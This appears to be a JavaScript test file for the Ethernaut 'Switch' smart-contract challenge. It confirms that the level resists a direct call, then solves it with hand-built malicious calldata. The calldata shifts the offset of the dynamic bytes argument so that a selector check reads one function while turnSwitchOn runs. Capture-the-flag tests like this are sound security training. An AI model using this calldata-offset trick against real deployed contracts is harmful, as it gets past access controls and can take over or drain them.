/*eslint no-undef: "off"*/
const { expectRevert } = require('openzeppelin-test-helpers');
const utils = require('../utils/TestUtils');

const Switch = artifacts.require('./levels/Switch.sol');
const SwitchFactory = artifacts.require('./levels/SwitchFactory.sol');

contract('Switch', function (accounts) {
  let ethernaut;
  let level;
  let instance;
  let player = accounts[0];

  before(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy();
    level = await SwitchFactory.new();
    await ethernaut.registerLevel(level.address);
    instance = await utils.createLevelInstance(
      ethernaut,
      level.address,
      player,
      Switch,
      { from: player }
    );
  });

  describe('instance', function () {
    it('should not be immediately solvable', async function () {
      // make sure the factory fails
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      );
      assert.equal(ethCompleted, false);
    });

    it('should revert when turnSwitchOn() is called', async function () {
      // turnSwitchOn() should revert on standard call from player
      await expectRevert(
        instance.turnSwitchOn({ from: player }),
        'Only the contract can call this'
      );
    });

    it('it should allow the user to solve the level', async function () {
      // build the necessary function selectors
      let flipSwitchSelector = web3.utils
        .sha3('flipSwitch(bytes)')
        .substring(2, 10);
      let onFunctionSelector = web3.utils
        .sha3('turnSwitchOn()')
        .substring(2, 10);
      let offFunctionSelector = web3.utils
        .sha3('turnSwitchOff()')
        .substring(2, 10);

      let dataPosition = '20'; // hex for 32
      let dataLength = 4; // _data only has a 4 byte length

      // construct standard calldata
      let calldata =
        flipSwitchSelector + //flipSwitch function selector
        '0'.repeat(62) +
        dataPosition.toString() + // hex position of _data
        '0'.repeat(63) +
        dataLength.toString() + // length of _data
        offFunctionSelector +
        '0'.repeat(56); // The _data variable, containing the turnSwitchOff selector

      // expect the turnSwitchOff function to not revert
      await instance.sendTransaction({ data: calldata });

      let newDataPosition = '60'; // skip four 32-byte slots in the calldata payload

      // generate malicious call data should allow turnSwithOn() to run
      calldata =
        flipSwitchSelector + // flipSwitch function selector
        '0'.repeat(62) +
        newDataPosition.toString() + // data position : skip 2 32-byte slots
        '0'.repeat(64) + // empty 32-byte slot - we don't care about it
        offFunctionSelector +
        '0'.repeat(56) + // the function selector that is checked by the modifier
        '0'.repeat(63) +
        dataLength.toString() + // the location of _data, starts with it's length
        onFunctionSelector +
        '0'.repeat(56); // the actual location of _data (we use the turnSwitchOn function selector)

      // Should allow us to call the turnSwitchOn function
      await instance.sendTransaction({ data: calldata });

      // ensure the level is completed
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      );
      assert.equal(ethCompleted, true);
    });
  });
});
